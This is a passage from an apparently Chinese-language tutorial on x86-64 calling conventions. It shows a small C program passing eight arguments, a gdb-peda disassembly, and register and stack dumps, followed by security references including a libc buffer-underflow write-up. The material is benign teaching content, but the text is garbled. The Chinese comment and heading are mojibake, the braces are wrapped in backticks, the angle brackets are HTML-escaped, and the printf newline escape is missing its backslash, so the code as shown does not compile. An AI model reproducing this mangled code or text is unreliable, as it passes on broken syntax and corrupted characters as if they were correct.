/*
64ä½å‡½æ•°ä¼ å‚å®éªŒ
*/


#include &lt;stdio.h&gt;


int func(int a1, int b2, int c3, int d4, int e5, int f6, int g7, int h8)`{`
    printf("%dn", a1+b2+c3+d4+e5+f6+g7+h8);
    return 0;
`}`


int main()`{`
    func('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h');
    return 0;
`}`


/*
Dump of assembler code for function main:
   0x0000000000400580 &lt;+0&gt;: push   rbp
   0x0000000000400581 &lt;+1&gt;: mov    rbp,rsp
=&gt; 0x0000000000400584 &lt;+4&gt;: push   0x68
   0x0000000000400586 &lt;+6&gt;: push   0x67
   0x0000000000400588 &lt;+8&gt;: mov    r9d,0x66
   0x000000000040058e &lt;+14&gt;:    mov    r8d,0x65
   0x0000000000400594 &lt;+20&gt;:    mov    ecx,0x64
   0x0000000000400599 &lt;+25&gt;:    mov    edx,0x63
   0x000000000040059e &lt;+30&gt;:    mov    esi,0x62
   0x00000000004005a3 &lt;+35&gt;:    mov    edi,0x61
   0x00000000004005a8 &lt;+40&gt;:    call   0x400526 &lt;func&gt;
   0x00000000004005ad &lt;+45&gt;:    add    rsp,0x10
   0x00000000004005b1 &lt;+49&gt;:    mov    eax,0x0
   0x00000000004005b6 &lt;+54&gt;:    leave  
   0x00000000004005b7 &lt;+55&gt;:    ret    
End of assembler dump.


gdb-peda$ c
Continuing.


[----------------------------------registers-----------------------------------]
...
RCX: 0x64 ('d')
RDX: 0x63 ('c')
RSI: 0x62 ('b')
RDI: 0x61 ('a')


RBP: 0x7fffffffde00 --&gt; 0x4005c0 (&lt;__libc_csu_init&gt;:    push   r15)
RSP: 0x7fffffffddf0 --&gt; 0x67 ('g')


RIP: 0x4005a8 (&lt;main+40&gt;:   call   0x400526 &lt;func&gt;)


R8 : 0x65 ('e')
R9 : 0x66 ('f')
...
[-------------------------------------code-------------------------------------]
   0x400599 &lt;main+25&gt;:  mov    edx,0x63
   0x40059e &lt;main+30&gt;:  mov    esi,0x62
   0x4005a3 &lt;main+35&gt;:  mov    edi,0x61
=&gt; 0x4005a8 &lt;main+40&gt;:  call   0x400526 &lt;func&gt;
   0x4005ad &lt;main+45&gt;:  add    rsp,0x10
   0x4005b1 &lt;main+49&gt;:  mov    eax,0x0
   0x4005b6 &lt;main+54&gt;:  leave  
   0x4005b7 &lt;main+55&gt;:  ret
...
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffddf0 --&gt; 0x67 ('g')
0008| 0x7fffffffddf8 --&gt; 0x68 ('h')
0016| 0x7fffffffde00 --&gt; 0x4005c0 (&lt;__libc_csu_init&gt;:   push   r15)
0024| 0x7fffffffde08 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:   mov    edi,eax)
0032| 0x7fffffffde10 --&gt; 0x1 
0040| 0x7fffffffde18 --&gt; 0x7fffffffdee8 --&gt; 0x7fffffffe266 ("/home/invincible/Desktop/test/64")
0048| 0x7fffffffde20 --&gt; 0x1f7ffcca0 
0056| 0x7fffffffde28 --&gt; 0x400580 (&lt;main&gt;:  push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value


Breakpoint 2, 0x00000000004005a8 in main () at 64_param_demo.c:13
13      func('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h');
gdb-peda$ 




*/
```



## 6.å‚è€ƒ

[LibcRealpathBufferUnderflow](https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/)<br>[https://www.freebuf.com/column/162202.html](https://www.freebuf.com/column/162202.html)<br>[https://bbs.pediy.com/thread-228678.htm](https://bbs.pediy.com/thread-228678.htm)
